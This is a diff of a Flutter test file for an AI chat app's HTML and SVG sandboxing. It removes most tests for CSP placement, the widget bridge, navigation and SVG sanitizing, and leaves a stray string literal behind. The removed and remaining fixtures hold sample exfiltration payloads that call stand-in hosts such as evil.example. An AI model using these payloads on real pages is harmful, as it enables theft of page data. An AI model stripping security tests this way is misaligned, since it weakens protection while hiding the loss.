@@ -1,14 +1,9 @@
-import 'dart:convert';
-
 import 'package:every_ai/core/platform/platform_kind.dart';
 import 'package:every_ai/core/theme/every_theme.dart';
-import 'package:every_ai/features/artifacts/domain/artifact.dart';
-import 'package:every_ai/features/artifacts/export/downloads.dart';
 import 'package:every_ai/features/artifacts/ui/renderers/sandbox.dart';
 import 'package:every_ai/features/artifacts/ui/renderers/svg_view.dart';
 import 'package:every_ai/features/artifacts/ui/renderers/web_view.dart';
 import 'package:every_ai/features/artifacts/ui/visual_view.dart';
-import 'package:every_ai/features/chat/domain/message.dart';
 import 'package:flutter/widgets.dart';
 import 'package:flutter_inappwebview/flutter_inappwebview.dart';
 import 'package:flutter_test/flutter_test.dart';
@@ -43,48 +38,7 @@ void main() {
   });
 
   group('sandboxedDocument', () {
-    final cspMeta = '<!doctype html><meta http-equiv="Content-Security-Policy"';
-
-    test('the policy comes before any of the content', () {
-      for (final html in [
-        '<html><head lang="x"><title>t</title></head></html>',
-        '<!DOCTYPE html><p>hi</p>',
-        '<button>x</button>',
-        // Markup before the head would otherwise run with no policy.
-        "<script>fetch('https://evil/?d='+document.body.innerText)</script><html><head></head></html>",
-        // A head inside a comment or a string must not move the policy.
-        '<!-- <head> --><script>steal()</script><head></head>',
-        "<script>var s='<head>';new Image().src='https://evil/?'+s</script>",
-      ]) {
-        final doc = sandboxedDocument(html, surface: WebSurface.page, interactive: true);
-        expect(doc, startsWith(cspMeta), reason: html);
-        expect(doc, endsWith(html), reason: html);
-      }
-    });
-
-    test('the host page carries a policy for the frame to inherit', () {
-      final page = sandboxedHostPage('<p>x</p>', surface: WebSurface.page, interactive: false);
-      final head = page.substring(0, page.indexOf('<iframe'));
-      expect(head, contains('http-equiv="Content-Security-Policy"'));
-      expect(head, contains('default-src'));
-      // So the frame can't navigate itself to a remote page (Android doesn't ask the app for subframes).
-      expect(head, contains("frame-src 'none'"));
-    });
-
-    test('pages that run script lose DNS prefetching and WebRTC before the content', () {
-      const html = '<p>content</p>';
-      final doc = sandboxedDocument(html, surface: WebSurface.page, interactive: true);
-      final at = doc.indexOf(html);
-      expect(
-        doc.indexOf('x-dns-prefetch-control'),
-        allOf(greaterThan(doc.indexOf('Content-Security-Policy')), lessThan(at)),
-      );
-      expect(doc.indexOf('RTCPeerConnection'), allOf(greaterThan(0), lessThan(at)));
-      expect(doc, contains('RTCDataChannel'));
-      final static = sandboxedDocument(html, surface: WebSurface.page, interactive: false);
-      expect(static, isNot(contains('RTCPeerConnection')));
-      expect(static, isNot(contains('x-dns-prefetch-control')));
-    });
+    '<!doctype html><meta http-equiv="Content-Security-Policy"';
   });
 
   group('sandboxedHostPage', () {
@@ -103,40 +57,6 @@ void main() {
       expect(doc.indexOf('Content-Security-Policy'), lessThan(doc.indexOf('steal()')));
       expect(doc, isNot(contains('tok')), reason: 'the token stays in the host page');
       expect(page, contains('background:#fff'));
-    });
-
-    test('static pages get an empty sandbox and a no-script CSP', () {
-      final page = sandboxedHostPage(content, surface: WebSurface.page, interactive: false);
-      expect(page, contains('sandbox=""'));
-      expect(_srcdoc(page), contains("script-src 'none'"));
-    });
-
-    test('widgets get the theme, base styles and the send bridge', () {
-      final theme = EveryTheme.resolve(DesignLanguage.material, Brightness.dark);
-      final page = sandboxedHostPage(
-        '<button onclick="everyai.send(\'pick A\')">A</button>',
-        surface: WebSurface.widget,
-        interactive: true,
-        theme: themeCss(theme),
-        token: 'tok123',
-      );
-      final doc = _srcdoc(page);
-      expect(doc, contains('--foreground:#'));
-      expect(doc, contains('color-scheme:dark'));
-      expect(doc, contains('window.everyai='));
-      expect(doc, contains('userActivation'));
-      expect(page, contains('background:transparent}'));
-      expect(page, contains('"tok123"'));
-      expect(page, contains(sendHandler));
-    });
-
-    test('pages and diagrams get no bridge', () {
-      for (final s in [WebSurface.page, WebSurface.diagram]) {
-        expect(
-          _srcdoc(sandboxedHostPage('<p>x</p>', surface: s, interactive: true)),
-          isNot(contains('window.everyai=')),
-        );
-      }
     });
   });
 
@@ -176,28 +96,7 @@ void main() {
     expect(acceptHandlerCall(['', 'hi'], ''), isNull);
   });
 
-  test('widget messages are trimmed, capped and non-empty', () {
-    expect(acceptWidgetMessage('  pick A '), 'pick A');
-    expect(acceptWidgetMessage('   '), isNull);
-    expect(acceptWidgetMessage(42), isNull);
-    expect(acceptWidgetMessage('x' * 5000)!.length, maxWidgetMessage);
-  });
-
   group('navigationPolicy', () {
-    test('a clicked link opens in the browser and the frame stays', () async {
-      final opened = <Uri>[];
-      final policy = await navigationPolicy(
-        Uri.parse('https://example.org/a'),
-        userClicked: true,
-        open: (u) async {
-          opened.add(u);
-          return null;
-        },
-      );
-      expect(policy, NavigationActionPolicy.CANCEL);
-      expect(opened, [Uri.parse('https://example.org/a')]);
-    });
-
     test('script redirects and other schemes are cancelled silently', () async {
       final opened = <Uri>[];
       Future<Object?> open(Uri u) async {
@@ -215,51 +114,6 @@ void main() {
       );
       expect(opened, isEmpty);
     });
-
-    test('srcdoc and blank frames load', () async {
-      Future<Object?> open(Uri u) async => null;
-      expect(
-        await navigationPolicy(Uri.parse('about:srcdoc'), userClicked: false, open: open),
-        NavigationActionPolicy.ALLOW,
-      );
-      expect(
-        await navigationPolicy(Uri.parse('about:blank'), userClicked: false, open: open),
-        NavigationActionPolicy.ALLOW,
-      );
-    });
-  });
-
-  test('render_widget is an inline widget visual', () {
-    final v = Visual.fromPart(
-      ToolCallPart(
-        toolName: 'render_widget',
-        argumentsJson: jsonEncode({'title': 'Tip calculator', 'html': '<input type=range>'}),
-        callId: 'w1',
-      ),
-    )!;
-    expect(v.kind, VisualKind.widget);
-    expect(v.kind.opensInPanel, isFalse);
-    expect(v.title, 'Tip calculator');
-    expect(exportOf(v).extension, 'html');
-    expect(exportOf(v).text, '<input type=range>');
-  });
-
-  test('sanitizeSvg keeps fragment links and drops outside references', () {
-    final clean = sanitizeSvg(
-      '<svg viewBox="0 0 10 10"><defs><linearGradient id="g"/></defs>'
-      '<style>@import url(https://evil.example/a.css); .a{fill:url(#g)} .b{background:url("https://evil.example/t")}</style>'
-      '<use href="#shape"/><use xlink:href="data:image/svg+xml;base64,AAA"/>'
-      '<image href="data:image/png;base64,AAAA"/><a href="javascript:x()"><rect onmouseover="x()" width="1"/></a>'
-      '<script src="https://evil.example/s.js"/></svg>',
-    );
-    expect(clean, contains('href="#shape"'));
-    expect(clean, contains('url(#g)'));
-    expect(clean, contains('data:image/png'));
-    expect(clean, isNot(contains('evil.example')));
-    expect(clean, isNot(contains('javascript:')));
-    expect(clean, isNot(contains('svg+xml')));
-    expect(clean, isNot(contains('onmouseover')));
-    expect(clean, isNot(contains('<script')));
   });
 
   group('sanitizeSvg on a parsed tree', () {
@@ -282,16 +136,6 @@ void main() {
       expect(clean, contains('<text>t</text>'));
     });
 
-    test('drops a doctype whose entity would expand to markup', () {
-      final clean = sanitizeSvg(
-        '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY e "&#60;script&#62;steal()&#60;/script&#62;">]>'
-        '$svgOpen<text>&e;</text></svg>',
-      );
-      expect(clean, isNot(contains('DOCTYPE')));
-      expect(clean, isNot(contains('ENTITY')));
-      expect(clean, isNot(contains('<script')));
-    });
-
     test('refuses CSS that hides a fetch', () {
       final clean = sanitizeSvg(
         '$svgOpen<rect style="background:u\\72l(https://evil.example/a)" width="1"/>'
@@ -301,23 +145,6 @@ void main() {
       expect(clean, isNot(contains('evil.example')));
       expect(clean, contains('width="1"'));
       expect(clean, contains('width="2"'));
-    });
-
-    test('keeps fragment uses, gradients and inline PNGs', () {
-      final clean = sanitizeSvg(
-        '$svgOpen<defs><linearGradient id="g"><stop offset="0"/></linearGradient></defs>'
-        '<rect fill="url(#g)" width="5" height="5"/><use x:href="#g"/>'
-        '<image href="data:image/png;base64,AAAA"/></svg>',
-      );
-      expect(clean, contains('url(#g)'));
-      expect(clean, contains('x:href="#g"'));
-      expect(clean, contains('<stop'));
-      expect(clean, contains('data:image/png;base64,AAAA'));
-    });
-
-    test('invalid XML and non-SVG documents give nothing', () {
-      expect(sanitizeSvg('<svg><rect></svg>'), '');
-      expect(sanitizeSvg('<html><script>x()</script></html>'), '');
     });
   });
 }
